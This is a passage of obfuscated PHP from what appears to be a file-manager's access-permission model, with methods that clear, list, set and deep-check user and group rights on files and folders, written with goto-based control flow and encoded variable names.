$AàÓ¹˜¢Ù£[1838] => intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[1838]]) ? intval($Bƒ¶Ñí·Äæ[$AàÓ¹˜¢Ù£[1838]]) : -1); } $this->where(array($AàÓ¹˜¢Ù£[408] => $e³èÉôãŒÄ))->delete(); $this->addAll($F˜’¦Æ½‹“); goto DƒíòğĞ¼; FŠ“ù‹™ä¼: if ($f¤À´É§®É[$AàÓ¹˜¢Ù£[402]] != SourceModel::TYPE_GROUP) { return !1; } $cÀäÚñ–š = 1; $B×Õ…ºã‘× = $f¤À´É§®É[$AàÓ¹˜¢Ù£[482]]; goto CíØ¤éÄ¨; e¨ùµªÔˆÁ: } public function authClear($f†öë™Æ×) { $aÄø–½ŒÁÌ =& $_SERVER[´¬]; $FÅÊìÃÏŸÒ = Model($aÄø–½ŒÁÌ[1206])->sourceInfo($f†öë™Æ×); $EÜÓÚñÁˆ = array($f†öë™Æ×); if ($FÅÊìÃÏŸÒ[$aÄø–½ŒÁÌ[401]] == $aÄø–½ŒÁÌ[87]) { $Cõì«¸†ÇÏ = array($aÄø–½ŒÁÌ[552] => array($aÄø–½ŒÁÌ[511], $FÅÊìÃÏŸÒ[$aÄø–½ŒÁÌ[485]] . $f†öë™Æ× . $aÄø–½ŒÁÌ[512])); $EÜÓÚñÁˆ = Model($aÄø–½ŒÁÌ[1206])->field($aÄø–½ŒÁÌ[408])->where($Cõì«¸†ÇÏ)->getField($aÄø–½ŒÁÌ[394], !0); $EÜÓÚñÁˆ[] = $f†öë™Æ×; } $this->where(array($aÄø–½ŒÁÌ[408] => array($aÄø–½ŒÁÌ[409], $EÜÓÚñÁˆ)))->delete(); return !0; } public function getAllChildren($B³ç‡‹ŞŠø) { goto BšÁ»ÉÒö; DàÕëˆê²Ğ: return $this->sourceListAuth($A¾àÄôÏàù); goto d‹³•‚ê‚—; c“«ç¯¨Û: if (!$AÅ„Ì£Î©) { return array(); } $bÊ¾Ô¤Ç = $eİ¯ÂšÙ¡Î[1859]; $fâÆ²Œöˆô = array($eİ¯ÂšÙ¡Î[394] => array($eİ¯ÂšÙ¡Î[7], $AÅ„Ì£Î©), $eİ¯ÂšÙ¡Î[421] => $eİ¯ÂšÙ¡Î[495]); goto DàäÑ˜¨‚Ï; BšÁ»ÉÒö: $eİ¯ÂšÙ¡Î =& $_SERVER[´¬]; $CëÆÌ¾íö = Model($eİ¯ÂšÙ¡Î[1206])->sourceInfo($B³ç‡‹ŞŠø); if ($CëÆÌ¾íö[$eİ¯ÂšÙ¡Î[401]] != $eİ¯ÂšÙ¡Î[87]) { return $this->sourceListAuth(array($B³ç‡‹ŞŠø)); } goto cİÛå‹ö÷£; DàäÑ˜¨‚Ï: $Eóáƒéôî‡ = Model($eİ¯ÂšÙ¡Î[790])->field($bÊ¾Ô¤Ç)->where($fâÆ²Œöˆô)->select(); $A¾àÄôÏàù = array($B³ç‡‹ŞŠø); foreach ($Eóáƒéôî‡ as $aÌ¥ ô“™Ù) { foreach ($DÄ¬Õ¤©ŠŞ as $A‘Ù¶•­Ğ™) { $AŠÂöè = $eİ¯ÂšÙ¡Î[47] . $A‘Ù¶•­Ğ™ . $eİ¯ÂšÙ¡Î[47]; $dòµ¥”’¶ğ = $aÌ¥ ô“™Ù[$eİ¯ÂšÙ¡Î[485]] . $aÌ¥ ô“™Ù[$eİ¯ÂšÙ¡Î[394]] . $eİ¯ÂšÙ¡Î[47]; if (strstr($dòµ¥”’¶ğ, $AŠÂöè)) { $A¾àÄôÏàù[] = $aÌ¥ ô“™Ù[$eİ¯ÂšÙ¡Î[394]]; break; } } } goto DàÕëˆê²Ğ; E‘¤÷Úà¢: if ($CëÆÌ¾íö[$eİ¯ÂšÙ¡Î[476]] == $eİ¯ÂšÙ¡Î[495] && $CëÆÌ¾íö[$eİ¯ÂšÙ¡Î[482]] != $dÍ·¶ˆæÖæ) { $DÄ¬Õ¤©ŠŞ = $this->groupChidldAllRootSource($CëÆÌ¾íö[$eİ¯ÂšÙ¡Î[482]]); } $AÅ„Ì£Î© = $this->field($eİ¯ÂšÙ¡Î[394])->group($eİ¯ÂšÙ¡Î[394])->select(); $AÅ„Ì£Î© = array_to_keyvalue($AÅ„Ì£Î©, $eİ¯ÂšÙ¡Î[33], $eİ¯ÂšÙ¡Î[394]); goto c“«ç¯¨Û; cİÛå‹ö÷£: if ($CëÆÌ¾íö[$eİ¯ÂšÙ¡Î[402]] != SourceModel::TYPE_GROUP) { return array(); } $dÍ·¶ˆæÖæ = 1; $DÄ¬Õ¤©ŠŞ = array($B³ç‡‹ŞŠø); goto E‘¤÷Úà¢; d‹³•‚ê‚—: } private function sourceListAuth($fÇéÆğ•ç) { goto BçŒù“İà; BçŒù“İà: $aíìÅºŒ¦ =& $_SERVER[´¬]; $a†´éô¸ˆ = Model($aíìÅºŒ¦[1206])->sourceListInfo($fÇéÆğ•ç, !0); $c¾ÅÅ øÆ = $this->sourceAuthSelect($fÇéÆğ•ç); goto E‹±Œ»ïƒñ; aç´±«ö…Š: array_multisort($BÂ§ÉÔ»ô, SORT_ASC, $fĞ¡õ‡“µâ); return $fĞ¡õ‡“µâ; goto Eß¯‡Ü«‚Æ; E‹±Œ»ïƒñ: $fĞ¡õ‡“µâ = array(); $BÂ§ÉÔ»ô = array(); foreach ($a†´éô¸ˆ as $FçÀ­İ–) { goto a®ƒà’”†; Fˆ¡“Æ†¹Ø: $FçÀ­İ–[$aíìÅºŒ¦[1860]] = $this->authTargetInfo($E†éˆãïºÜ); $FçÀ­İ–[$aíìÅºŒ¦[493]] = rtrim($FçÀ­İ–[$aíìÅºŒ¦[488]], $aíìÅºŒ¦[8]) . $aíìÅºŒ¦[8] . ltrim($FçÀ­İ–[$aíìÅºŒ¦[493]], $aíìÅºŒ¦[8]); $fĞ¡õ‡“µâ[] = $FçÀ­İ–; goto cšÊÒÓˆÄ½; aÖßçëšÙñ: unset($FçÀ­İ–[$aíìÅºŒ¦[85]]); $E†éˆãïºÜ = $c¾ÅÅ øÆ[$FçÀ­İ–[$aíìÅºŒ¦[394]]]; if (!$E†éˆãïºÜ) { continue; } goto Fˆ¡“Æ†¹Ø; a®ƒà’”†: unset($FçÀ­İ–[$aíìÅºŒ¦[432]]); unset($FçÀ­İ–[$aíìÅºŒ¦[430]]); unset($FçÀ­İ–[$aíìÅºŒ¦[404]]); goto aÖßçëšÙñ; cšÊÒÓˆÄ½: $eèºî…îÕ = count(explode($aíìÅºŒ¦[8], trim($FçÀ­İ–[$aíìÅºŒ¦[493]], $aíìÅºŒ¦[8]))); $BÂ§ÉÔ»ô[] = $eèºî…îÕ + ($FçÀ­İ–[$aíìÅºŒ¦[29]] == $aíìÅºŒ¦[77] ? 0 : 1000); goto f‘‘óªÀÁ‘; f‘‘óªÀÁ‘: } goto aç´±«ö…Š; Eß¯‡Ü«‚Æ: } private function groupChidldAllRootSource($C–Û¤Í•ª›) { $e´ã×ãÃ‡ê =& $_SERVER[´¬]; $Aƒã³´äó = Model($e´ã×ãÃ‡ê[1861])->groupChildrenAll($C–Û¤Í•ª›); $fÍÓÜË„‚ = array($e´ã×ãÃ‡ê[476] => 0, $e´ã×ãÃ‡ê[482] => array($e´ã×ãÃ‡ê[7], $Aƒã³´äó), $e´ã×ãÃ‡ê[402] => SourceModel::TYPE_GROUP); $C¬Šà°¢Ù = Model($e´ã×ãÃ‡ê[790])->field($e´ã×ãÃ‡ê[394])->where($fÍÓÜË„‚)->select(); $C¬Šà°¢Ù = array_to_keyvalue($C¬Šà°¢Ù, $e´ã×ãÃ‡ê[33], $e´ã×ãÃ‡ê[394]); return $C¬Šà°¢Ù; } private function authTargetInfo($A–¨—Ê×‚) { goto FÓ¤Â¿±­‘; D„Ü˜Ìá‰µ: $AÇ™„ì¨é = 2 << 25; foreach ($A–¨—Ê×‚ as $B˜ˆŞÈÎÀ¡) { goto bñô¢ğöÂ»; d÷‡’¤ù‘‰: $aÍÕ¡Û—Ü¥ = 0; if ($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[402]] == SourceModel::TYPE_GROUP) { $aÍÕ¡Û—Ü¥ = $AÇ™„ì¨é * 2; } if ($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[402]] == SourceModel::TYPE_USER) { $aÍÕ¡Û—Ü¥ = $AÇ™„ì¨é; } goto b¹Š¥ÏÈ˜; bñô¢ğöÂ»: $e§‰äµöà½ = Model($D“°¿³¬æÕ[1856])->listData($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[1784]]); if (!$e§‰äµöà½) { continue; } if ($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[402]] == SourceModel::TYPE_USER) { $D’Ğ„‡Ò»Ÿ = Model($D“°¿³¬æÕ[501])->getInfoSimpleOuter($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[482]]); if ($D’Ğ„‡Ò»Ÿ[$D“°¿³¬æÕ[1526]] == $D“°¿³¬æÕ[1086]) { continue; } if ($D’Ğ„‡Ò»Ÿ[$D“°¿³¬æÕ[1526]] == $D“°¿³¬æÕ[495]) { $D’Ğ„‡Ò»Ÿ[$D“°¿³¬æÕ[28]] = LNG($D“°¿³¬æÕ[1862]); } } else { $D’Ğ„‡Ò»Ÿ = Model($D“°¿³¬æÕ[484])->getInfoSimple($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[482]]); } goto e™›½Ç´‹; b¹Š¥ÏÈ˜: if ($B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[402]] == SourceModel::TYPE_USER && $B˜ˆŞÈÎÀ¡[$D“°¿³¬æÕ[482]] == $D“°¿³¬æÕ[495]) { $aÍÕ¡Û—Ü¥ = 0; } $DÖ„ÈàŞÔŸ[] = $e§‰äµöà½[$D“°¿³¬æÕ[404]] + $aÍÕ¡Û—Ü¥; goto d´”ï¡›¶; e™›½Ç´‹: if (!$D’Ğ„‡Ò»Ÿ) { continue; } $D’Ğ„‡Ò»Ÿ[$D“°¿³¬æÕ[444]] = $e§‰äµöà½; $C’ù³ßÄŠ‰[] = $D’Ğ„‡Ò»Ÿ; goto d÷‡’¤ù‘‰; d´”ï¡›¶: } array_multisort($DÖ„ÈàŞÔŸ, SORT_DESC, $C’ù³ßÄŠ‰); goto FÛäÆ¾™Ó; FÛäÆ¾™Ó: return $C’ù³ßÄŠ‰; goto e„¸³¸„£; FÓ¤Â¿±­‘: $D“°¿³¬æÕ =& $_SERVER[´¬]; $C’ù³ßÄŠ‰ = array(); $DÖ„ÈàŞÔŸ = array(); goto D„Ü˜Ìá‰µ; e„¸³¸„£: } public function getAllChildrenByUser($féˆ©Æ÷…ƒ, $aàÊÖ¤¯õÔ) { goto a»»¿ÒƒÄ‰; cÔÎ§«ĞÚÏ: $bÇ‹ëá¯Ù = Model($F‚äˆÑ¡Ó[1206])->sourceInfo($féˆ©Æ÷…ƒ); $E§Ä£Ùœò = array(); $cßƒƒÙÎŸ± = 1; goto C„…§ù•¥¢; a»»¿ÒƒÄ‰: $F‚äˆÑ¡Ó =& $_SERVER[´¬]; $C¿¬ôËö¯À = Model($F‚äˆÑ¡Ó[505])->getInfo($aàÊÖ¤¯õÔ); if (!$aàÊÖ¤¯õÔ || !$féˆ©Æ÷…ƒ || !$C¿¬ôËö¯À) { return array(); } goto cÔÎ§«ĞÚÏ; A³‹—®ô: return $aÀ„ç²Áˆ; goto d”Ğ‘»ß±Å; CåÎ¤Ôá°·: foreach ($D»¬ŠŒ ¤µ as $a¦„³ÆóºÄ) { $d™¶½‹Ç¼ = !1; foreach ($a¦„³ÆóºÄ[$F‚äˆÑ¡Ó[1860]] as $DòÖ˜¾»Œ) { if ($DòÖ˜¾»Œ[$F‚äˆÑ¡Ó[1526]]) { if ($DòÖ˜¾»Œ[$F‚äˆÑ¡Ó[1526]] == $aàÊÖ¤¯õÔ) { $d™¶½‹Ç¼ = !0; break; } } if ($DòÖ˜¾»Œ[$F‚äˆÑ¡Ó[1689]]) { if ($this->groupContainUser($DòÖ˜¾»Œ[$F‚äˆÑ¡Ó[1689]], $aàÊÖ¤¯õÔ)) { $d™¶½‹Ç¼ = !0; break; } } } if ($d™¶½‹Ç¼) { $aÀ„ç²Áˆ[] = $a¦„³ÆóºÄ; } $Dƒ§§Ùù‘ˆ = $a¦„³ÆóºÄ[$F‚äˆÑ¡Ó[394]]; if (isset($E§Ä£Ùœò[$Dƒ§§Ùù‘ˆ])) { $a¦„³ÆóºÄ[$F‚äˆÑ¡Ó[1860]][] = $E§Ä£Ùœò[$Dƒ§§Ùù‘ˆ][0]; $E§Ä£Ùœò[$Dƒ§§Ùù‘ˆ] = !1; } } $E§Ä£Ùœò = array_filter(array_values($E§Ä£Ùœò)); $aÀ„ç²Áˆ = array_merge($E§Ä£Ùœò, $aÀ„ç²Áˆ); goto A³‹—®ô; C„…§ù•¥¢: if ($bÇ‹ëá¯Ù[$F‚äˆÑ¡Ó[476]] == $F‚äˆÑ¡Ó[495] && $bÇ‹ëá¯Ù[$F‚äˆÑ¡Ó[482]] != $cßƒƒÙÎŸ± && $this->groupContainUser($bÇ‹ëá¯Ù[$F‚äˆÑ¡Ó[482]], $aàÊÖ¤¯õÔ)) { foreach ($C¿¬ôËö¯À[$F‚äˆÑ¡Ó[1863]] as $dÍºÀÄ†Î§) { $Eì³Ó¬Ç­ = Model($F‚äˆÑ¡Ó[484])->getInfo($dÍºÀÄ†Î§[$F‚äˆÑ¡Ó[1689]]); $AöÈË’Ÿì‚ = Model($F‚äˆÑ¡Ó[505])->getInfoSimpleOuter($aàÊÖ¤¯õÔ); $AöÈË’Ÿì‚[$F‚äˆÑ¡Ó[444]] = $dÍºÀÄ†Î§[$F‚äˆÑ¡Ó[404]]; if (Model($F‚äˆÑ¡Ó[1856])->authCheckAction($dÍºÀÄ†Î§[$F‚äˆÑ¡Ó[404]][$F‚äˆÑ¡Ó[404]], $F‚äˆÑ¡Ó[1709])) { continue; } $FÌä ˜Â— = array($F‚äˆÑ¡Ó[28] => $F‚äˆÑ¡Ó[1479] . $Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[28]], $F‚äˆÑ¡Ó[394] => $Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[85]][$F‚äˆÑ¡Ó[394]], $F‚äˆÑ¡Ó[76] => KodIO::make($Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[85]][$F‚äˆÑ¡Ó[394]]), $F‚äˆÑ¡Ó[476] => $F‚äˆÑ¡Ó[495], $F‚äˆÑ¡Ó[402] => $F‚äˆÑ¡Ó[1016], $F‚äˆÑ¡Ó[29] => $F‚äˆÑ¡Ó[516], $F‚äˆÑ¡Ó[493] => $Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[489]], $F‚äˆÑ¡Ó[1689] => $Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[1689]], $F‚äˆÑ¡Ó[486] => $Eì³Ó¬Ç­[$F‚äˆÑ¡Ó[476]], $F‚äˆÑ¡Ó[1860] => array($AöÈË’Ÿì‚)); $E§Ä£Ùœò[$FÌä ˜Â—[$F‚äˆÑ¡Ó[394]]] = $FÌä ˜Â—; } } $aÀ„ç²Áˆ = array(); $D»¬ŠŒ ¤µ = $this->getAllChildren($féˆ©Æ÷…ƒ); goto CåÎ¤Ôá°·; d”Ğ‘»ß±Å: } public function setAllChildrenByUser($FÏ‡Ë©«ÍÀ, $cì£ÆÙó, $Bïƒ¼ì®Ù) { $dˆÄÂôíĞ =& $_SERVER[´¬]; $DÅÌîÇ­÷” = $this->getAllChildrenByUser($FÏ‡Ë©«ÍÀ, $cì£ÆÙó); if (!$Bïƒ¼ì®Ù || !$DÅÌîÇ­÷”) { return !1; } foreach ($DÅÌîÇ­÷” as $b™çª¾‘ÔÒ) { $c²ğ´Î…¢ = array(); foreach ($b™çª¾‘ÔÒ[$dˆÄÂôíĞ[1860]] as $a¯¨ĞáËôÑ) { $DØµ™ãÑÚò = $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[444]]; $e‚…·¢ãÇ’ = $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1526]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $E´‡£Í» = $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1526]] ? $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1526]] : $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1689]]; if ($a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1526]] && $a¯¨ĞáËôÑ[$dˆÄÂôíĞ[1526]] == $cì£ÆÙó) { continue; } $c²ğ´Î…¢[] = array($dˆÄÂôíĞ[394] => $b™çª¾‘ÔÒ[$dˆÄÂôíĞ[394]], $dˆÄÂôíĞ[402] => $e‚…·¢ãÇ’, $dˆÄÂôíĞ[482] => intval($E´‡£Í»), $dˆÄÂôíĞ[1784] => isset($DØµ™ãÑÚò[$dˆÄÂôíĞ[392]]) ? intval($DØµ™ãÑÚò[$dˆÄÂôíĞ[392]]) : 0, $dˆÄÂôíĞ[1838] => isset($DØµ™ãÑÚò[$dˆÄÂôíĞ[1838]]) ? intval($DØµ™ãÑÚò[$dˆÄÂôíĞ[1838]]) : -1); } $c²ğ´Î…¢[] = array($dˆÄÂôíĞ[394] => $b™çª¾‘ÔÒ[$dˆÄÂôíĞ[394]], $dˆÄÂôíĞ[402] => SourceModel::TYPE_USER, $dˆÄÂôíĞ[482] => intval($cì£ÆÙó), $dˆÄÂôíĞ[1784] => intval($Bïƒ¼ì®Ù), $dˆÄÂôíĞ[1838] => -1); $this->where(array($dˆÄÂôíĞ[408] => $b™çª¾‘ÔÒ[$dˆÄÂôíĞ[394]]))->delete(); $this->addAll($c²ğ´Î…¢); } return !0; } public function get($DˆïÏôŠ) { $aÇÓÊ°šô› = $this->getSourceList(array($DˆïÏôŠ), !0); return $aÇÓÊ°šô›[0]; } public function getSourceList($A•«øˆ», $d®ì‹ Œˆ = false, $bº¤¨íÂ´£ = false) { goto CŸ¬Ïï »™; c¨Ü™ô·°‚: $D„Í·¯™š = $this->userIsRoot($bº¤¨íÂ´£); $aŠ¸â…£ã´ = AuthModel::authAll(); $Eˆ­¿ƒ© = array($aÜ®ÛÃ¾Ö[405] => $aŠ¸â…£ã´, $aÜ®ÛÃ¾Ö[1865] => array($aÜ®ÛÃ¾Ö[410] => 0, $aÜ®ÛÃ¾Ö[1695] => $aŠ¸â…£ã´, $aÜ®ÛÃ¾Ö[411] => LNG($aÜ®ÛÃ¾Ö[1866]), $aÜ®ÛÃ¾Ö[1710] => $aÜ®ÛÃ¾Ö[1867])); goto Cêñöğ‘¾Å; d ¹åñØ¦ß: foreach ($d®ì‹ Œˆ as $BáŸ¾ì„ï´ => $aš¬ìéØêÇ) { $EÏÔ°ª‰¤š = $CöæÏñ‹´·->parentLevelArray($aš¬ìéØêÇ[$aÜ®ÛÃ¾Ö[485]]); $bê‹Çäí˜Œ = array_merge($bê‹Çäí˜Œ, array($BáŸ¾ì„ï´), array_reverse($EÏÔ°ª‰¤š)); } $bê‹Çäí˜Œ = array_values(array_unique($bê‹Çäí˜Œ)); if (!$bê‹Çäí˜Œ) { return array(); } goto A“ÆÓäÒãÏ; A“ÆÓäÒãÏ: $c³ŒÀÆ»Ì = $this->sourceAuthSelect($bê‹Çäí˜Œ); $fñ¾×ŒùÖÈ = array(); foreach ($bê‹Çäí˜Œ as $A‡ÎŒ–ä—) { if (isset($c³ŒÀÆ»Ì[$A‡ÎŒ–ä—])) { $fñ¾×ŒùÖÈ[$A‡ÎŒ–ä—] = $c³ŒÀÆ»Ì[$A‡ÎŒ–ä—]; } } goto c¨Ü™ô·°‚; Cêñöğ‘¾Å: $D‹ÄÎ´¶» = array(); foreach ($d®ì‹ Œˆ as $A‡ÎŒ–ä— => $f±ïÚ»òƒ) { if ($D„Í·¯™š) { $D‹ÄÎ´¶»[$A‡ÎŒ–ä—] = $Eˆ­¿ƒ©; continue; } $D‹ÄÎ´¶»[$A‡ÎŒ–ä—] = $this->makeSourceAuth($f±ïÚ»òƒ, $fñ¾×ŒùÖÈ, $bº¤¨íÂ´£); } return $D‹ÄÎ´¶»; goto a¢¾¢ä‚àÌ; CŸ¬Ïï »™: $aÜ®ÛÃ¾Ö =& $_SERVER[´¬]; if (!$A•«øˆ») { return array(); } $CöæÏñ‹´· = Model($aÜ®ÛÃ¾Ö[1206]); goto CÅÚÓ¦í”; CÅÚÓ¦í”: if (!$d®ì‹ Œˆ && count($A•«øˆ») == 1) { $d®ì‹ Œˆ = array(); $d®ì‹ Œˆ[$A•«øˆ»[0]] = $CöæÏñ‹´·->sourceInfo($A•«øˆ»[0]); } if (!$d®ì‹ Œˆ) { $EÁîŸÙîÅ = array($aÜ®ÛÃ¾Ö[408] => array($aÜ®ÛÃ¾Ö[409], $A•«øˆ»)); $d®ì‹ Œˆ = $CöæÏñ‹´·->field($aÜ®ÛÃ¾Ö[1864])->where($EÁîŸÙîÅ)->select(); $d®ì‹ Œˆ = array_to_keyvalue($d®ì‹ Œˆ, $aÜ®ÛÃ¾Ö[394]); } $bê‹Çäí˜Œ = $A•«øˆ»; goto d ¹åñØ¦ß; a¢¾¢ä‚àÌ: } public function authDeepCheck($AíÄŸÉ·à‘, $E’èêÛ”¬ = false) { goto DÇ¯ŸñöÙ; bÒëÔ‡ä¯ê: if (!in_array($AíÄŸÉ·à‘, $b·Íã‹‰[$b°¸¯´›¡[1868]])) { return !1; } $F¬ÅÅÉºíŸ = array(); foreach ($b·Íã‹‰[$b°¸¯´›¡[1869]] as $fí­™Ô»§ => $CŠ­¶ó°İ¶) { if (!in_array($AíÄŸÉ·à‘, $CŠ­¶ó°İ¶)) { continue; } $F¬ÅÅÉºíŸ[] = $fí­™Ô»§; } goto AŞŞßóÆ¨­; DÇ¯ŸñöÙ: $b°¸¯´›¡ =& $_SERVER[´¬]; $E’èêÛ”¬ = $E’èêÛ”¬ ? $E’èêÛ”¬ : USER_ID; $b·Íã‹‰ = $this->makeAuthDeep($E’èêÛ”¬); goto bÒëÔ‡ä¯ê; AŞŞßóÆ¨­: if (!$F¬ÅÅÉºíŸ) { return !1; } $c™è¸§×ƒÓ = $F¬ÅÅÉºíŸ ? $F¬ÅÅÉºíŸ[0] : $AíÄŸÉ·à‘; return array($b°¸¯´›¡[405] => -1, $b°¸¯´›¡[444] => array($b°¸¯´›¡[410] => $b°¸¯´›¡[1086], $b°¸¯´›¡[1695] => $b°¸¯´›¡[495], $b°¸¯´›¡[411] => LNG($b°¸¯´›¡[1870]), $b°¸¯´›¡[1710] => $b°¸¯´›¡[1871]), $b°¸¯´›¡[1872] => LNG($b°¸¯´›¡[1873]), $b°¸¯´›¡[1874] => $this->sourceAuthInfo($c™è¸§×ƒÓ)); goto EõÃš±®å¿; EõÃš±®å¿: } protected function makeAuthDeep($d Š£¥âÇ¦ = false) { goto A´¸°ªÈ½; C¨”–Ø›½: $cÀ‘ç×É = $BÃÈ›’î±; foreach ($cÀ‘ç×É as $a„²ò³’Óù) { $c×•ï¹Õµõ = $b´¥ÈºĞãè->getInfo($a„²ò³’Óù); $FÇø‰—Š = $e‡ë†‚¥¡µ->parentLevelArray($c×•ï¹Õµõ[$båø‡ƒéëÒ[485]]); $BÃÈ›’î± = array_merge($BÃÈ›’î±, $FÇø‰—Š); } $BÃÈ›’î± = array_values(array_unique($BÃÈ›’î±)); goto BâºÒÍ›È; a°ÎóÇã‰²: $BÃÈ›’î± = $E×’Ì¡¤ª°; $e‡ë†‚¥¡µ = Model($båø‡ƒéëÒ[1206]); $b´¥ÈºĞãè = Model($båø‡ƒéëÒ[484]); goto C…ŠÌïÈóë; e¡ØÓˆœÄ¾: if (isset($dçÔœÆÍ¡È[$d Š£¥âÇ¦])) { return $dçÔœÆÍ¡È[$d Š£¥âÇ¦]; } $AŒ‘„Ï‚Ó = Model($båø‡ƒéëÒ[1875])->listData(); $a‰›¢¸ğµ© = array(); goto eÛ‹º‡ŠßÉ; C…ŠÌïÈóë: $Dã›”Ò¼ïÚ = array(); $D‰é…í¢™³ = array(); $A„·Ë°²·Š = array(); goto FŞÛ¤é„‘; eÙ¯¹Ÿ´Õ: if ($E×’Ì¡¤ª°) { $DŠ©¾˜œ‡Ì = array(array($båø‡ƒéëÒ[402] => SourceModel::TYPE_USER, $båø‡ƒéëÒ[482] => $d Š£¥âÇ¦), array($båø‡ƒéëÒ[402] => SourceModel::TYPE_GROUP, $båø‡ƒéëÒ[482] => array($båø‡ƒéëÒ[409], $E×’Ì¡¤ª°)), $båø‡ƒéëÒ[958] => $båø‡ƒéëÒ[1776]); } $Dê¿§±È²¹ = $this->field($båø‡ƒéëÒ[1876])->where($DŠ©¾˜œ‡Ì)->select(); $DãšÜ‘¿Ê = array(); goto dÔóøøÛ¡š; FŞÛ¤é„‘: $eï›ã’Œç¥ = array(); if ($DãšÜ‘¿Ê) { $féŞ§ßÀ = $e‡ë†‚¥¡µ->where(array($båø‡ƒéëÒ[394] => array($båø‡ƒéëÒ[409], $DãšÜ‘¿Ê)))->select(); foreach ($féŞ§ßÀ as $CÛØÖ¶½µ) { $FÇø‰—Š = $e‡ë†‚¥¡µ->parentLevelArray($CÛØÖ¶½µ[$båø‡ƒéëÒ[485]]); $c¥åÊ„øõ˜ = array_merge($c¥åÊ„øõ˜, $FÇø‰—Š); $BÃÈ›’î±[] = $CÛØÖ¶½µ[$båø‡ƒéëÒ[482]]; $Dã›”Ò¼ïÚ[$CÛØÖ¶½µ[$båø‡ƒéëÒ[394]]] = $FÇø‰—Š; $D‰é…í¢™³[$CÛØÖ¶½µ[$båø‡ƒéëÒ[394]]] = $CÛØÖ¶½µ[$båø‡ƒéëÒ[482]]; } } $BÃÈ›’î± = array_values(array_unique($BÃÈ›’î±)); goto C¨”–Ø›½; BâºÒÍ›È: foreach ($BÃÈ›’î± as $a„²ò³’Óù) { $c×•ï¹Õµõ = $b´¥ÈºĞãè->getInfo($a„²ò³’Óù); $c¥åÊ„øõ˜[] = $c×•ï¹Õµõ[$båø‡ƒéëÒ[85]][$båø‡ƒéëÒ[394]]; $A„·Ë°²·Š[$a„²ò³’Óù] = $c×•ï¹Õµõ[$båø‡ƒéëÒ[85]][$båø‡ƒéëÒ[394]]; $eï›ã’Œç¥[$a„²ò³’Óù] = $e‡ë†‚¥¡µ->parentLevelArray($c×•ï¹Õµõ[$båø‡ƒéëÒ[485]]); } foreach ($Dã›”Ò¼ïÚ as $e»ÈßÌÏã => $E«‚ÃÆÓ§á) { $aùÎ£‹‰³ = $D‰é…í¢™³[$e»ÈßÌÏã]; if (!$aùÎ£‹‰³ || !$A„·Ë°²·Š[$aùÎ£‹‰³]) { continue; } $C¹Õ•Õ§—‘ = array(); foreach ($eï›ã’Œç¥[$aùÎ£‹‰³] as $a„²ò³’Óù) { $C¹Õ•Õ§—‘[] = $A„·Ë°²·Š[$a„²ò³’Óù]; } $Dã›”Ò¼ïÚ[$e»ÈßÌÏã] = array_merge($C¹Õ•Õ§—‘, $E«‚ÃÆÓ§á); } $c¥åÊ„øõ˜ = array_values(array_unique($c¥åÊ„øõ˜)); goto e‘‹ğ³“Ş—; e‘‹ğ³“Ş—: $B·Ô¼â›…È = array($båø‡ƒéëÒ[1868] => $c¥åÊ„øõ˜, $båø‡ƒéëÒ[1869] => $Dã›”Ò¼ïÚ); $dçÔœÆÍ¡È[$d Š£¥âÇ¦] = $B·Ô¼â›…È; return $B·Ô¼â›…È; goto e»Æ–ÕŠÆÊ; A´¸°ªÈ½: $båø‡ƒéëÒ =& $_SERVER[´¬]; static $dçÔœÆÍ¡È = array(); $d Š£¥âÇ¦ = $d Š£¥âÇ¦ ? $d Š£¥âÇ¦ : USER_ID; goto e¡ØÓˆœÄ¾; dÔóøøÛ¡š: $dÁÌâ’Î¤ = array_to_keyvalue_group($Dê¿§±È²¹, $båø‡ƒéëÒ[394]); foreach ($dÁÌâ’Î¤ as $C÷·è¶º“Ò => $b‚‘¥×Ÿñ) { $DÇğ—éøâ = $this->authArrayCheck($b‚‘¥×Ÿñ, $d Š£¥âÇ¦); if ($DÇğ—éøâ[$båø‡ƒéëÒ[405]] > 0) { $DãšÜ‘¿Ê[] = $C÷·è¶º“Ò . $båø‡ƒéëÒ[33]; } } $c¥åÊ„øõ˜ = array(); goto a°ÎóÇã‰²; eÛ‹º‡ŠßÉ: foreach ($AŒ‘„Ï‚Ó as $Cš‚Á†Ûœ) { if ($Cš‚Á†Ûœ[$båø‡ƒéëÒ[404]] == 0 && $Cš‚Á†Ûœ[$båø‡ƒéëÒ[1711]] == $båø‡ƒéëÒ[87]) { $a‰›¢¸ğµ©[] = $Cš‚Á†Ûœ[$båø‡ƒéëÒ[392]]; } } $E×’Ì¡¤ª° = $this->userGroupParents($d Š£¥âÇ¦); $DŠ©¾˜œ‡Ì = array($båø‡ƒéëÒ[402] => SourceModel::TYPE_USER, $båø‡ƒéëÒ[482] => $d Š£¥âÇ¦); goto eÙ¯¹Ÿ´Õ; e»Æ–ÕŠÆÊ: } private function makeSourceAuth($dŒ£“…Ÿ½Æ, $CÓ˜İ«ßñç, $fÑğ•®Ş† = false) { goto dåàãË×·¾; DŞÛÑ‰³ß: $cÂ …‘® = Model($dØî‹‰»¿[1206])->parentLevelArray($dŒ£“…Ÿ½Æ[$dØî‹‰»¿[485]]); $cÂ …‘® = array_merge(array($dŒ£“…Ÿ½Æ[$dØî‹‰»¿[394]]), array_reverse($cÂ …‘®)); $E¸‹ëµôñ = !1; goto dŒÔÃ¢Õ†×; dåàãË×·¾: $dØî‹‰»¿ =& $_SERVER[´¬]; $C­†˜Ô¸† = $dØî‹‰»¿[87]; $f†óÖ‰»È² = 